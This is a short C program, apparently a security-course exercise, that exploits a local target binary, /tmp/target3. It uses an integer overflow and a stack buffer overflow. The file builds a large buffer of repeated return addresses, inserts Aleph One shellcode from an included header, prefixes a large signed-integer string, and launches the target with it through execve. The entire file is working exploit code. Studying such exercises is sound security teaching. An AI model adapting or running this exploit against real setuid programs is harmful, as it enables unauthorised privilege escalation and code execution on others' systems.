#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char overflow[5664];  //"2147483848";  //set beginning of overflow to 0x 800000c9 
  int i=0;
  for(i=3;i<5660;i+=4){
    overflow[i]=0x68;
    overflow[i+1]=0xd2;
    overflow[i+2]=0xff;
    overflow[i+3]=0xbf;
  }
  for(i=11; i<(strlen(shellcode)+11);i++){    //write beginning of buffer with shellcode provided from aleph one (in shellcode.h)
    overflow[i]=shellcode[i-11];
  } 
  overflow[0]='2';
  overflow[1]='1';
  overflow[2]='4';
  overflow[3]='7';
  overflow[4]='4';
  overflow[5]='8';
  overflow[6]='3';
  overflow[7]='8';
  overflow[8]='4';
  overflow[9]='9';
  overflow[10]=',';
  args[0] = TARGET; args[1] = overflow; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
